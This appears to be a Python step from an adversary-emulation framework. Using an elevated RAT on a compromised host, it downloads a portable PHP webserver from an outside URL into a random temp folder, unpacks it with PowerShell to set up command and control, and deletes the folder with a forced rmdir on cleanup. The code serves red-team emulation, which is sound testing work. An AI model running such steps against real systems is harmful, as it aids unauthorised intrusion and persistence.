from plugins.adversary.app.operation.operation import Step, OPVar, OPHost, OPRat, OPSoftware
from plugins.adversary.app.commands import *
from plugins.adversary.app.custom import *

class WebServerInstall(Step):
    """    Description:
            This step prepares the installation of a PHP webserver.
           Requirements:
            This step only requires the existence of a RAT on a host in order to run.
    """
    display_name = 'webserver_install'
    summary = 'Prepares webserver installation'
    attack_mapping = [('T1094', 'Command and Control')]
    preconditions = [('rat', OPRat({'elevated': True })),
                     ('host', OPHost(OPVar('rat.host')))]
    postconditions = [('software_g', OPSoftware({'name': 'webserver', 'installed': False, 'downloaded': False}))]
    significant_parameters = ['host']


    @staticmethod
    def description(host):
        return 'Preparing webserver install on {}'.format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, software_g):
        name = 'webserver'
        download_url = 'http://www.usbwebserver.net/downloads/USBWebserver%20v8.6.zip'
        download_loc = (get_temp_folder(host, rat) + '{}.zip'.format(random_string()))
        install_loc = (get_temp_folder(host, rat) + '{}\\'.format(random_string()))
        install_command = {
            'process': 'powershell.exe',
            'args': '/command "Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\'{}\', \'{}\')"'.format(download_loc, install_loc),
        }
        (await software_g({
            'host': host,
            'name': name,
            'installed': False,
            'install_command': install_command,
            'install_loc': install_loc,
            'downloaded': False,
            'download_url': download_url,
            'download_loc': download_loc,
        }))
        return True

    @staticmethod
    async def cleanup(cleaner, host, software_g):
        for software in software_g:
            if (not (await cleaner.run_on_agent(host, command.CommandLine('rmdir /s /q {}'.format(software.install_loc)), (lambda x: (x.strip() == ''))))):
                (await cleaner.console_log(host, "Can't delete webserver folder on {} ({})".format(host.fqdn, software.install_loc)))
